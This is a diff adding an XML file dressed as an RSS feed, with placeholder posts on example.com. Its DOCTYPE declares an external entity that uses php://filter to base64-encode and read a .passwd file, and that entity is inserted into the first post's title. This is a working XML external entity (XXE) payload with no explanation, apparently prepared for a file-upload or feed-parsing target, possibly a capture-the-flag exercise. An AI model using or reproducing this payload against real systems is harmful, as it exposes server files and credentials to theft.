@@ -1,0 +1,32 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=.passwd">
+]>
+<rss version="2.0">
+  <channel>
+    <title>Example Feed</title>
+    <link>https://www.example.com</link>
+    <description>This is an example RSS feed</description>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 20 May 2025 12:00:00 +0000</lastBuildDate>
+    <pubDate>Mon, 20 May 2025 12:00:00 +0000</pubDate>
+    <ttl>1800</ttl>
+
+    <item>
+      <title>&xxe;</title>
+      <link>https://www.example.com/posts/1</link>
+      <description>This is the first post in our example RSS feed.</description>
+      <pubDate>Mon, 20 May 2025 10:00:00 +0000</pubDate>
+      <guid>https://www.example.com/posts/1</guid>
+    </item>
+
+    <item>
+      <title>Second Post</title>
+      <link>https://www.example.com/posts/2</link>
+      <description>This is the second post with more news and updates.</description>
+      <pubDate>Mon, 20 May 2025 11:00:00 +0000</pubDate>
+      <guid>https://www.example.com/posts/2</guid>
+    </item>
+  </channel>
+</rss>
+
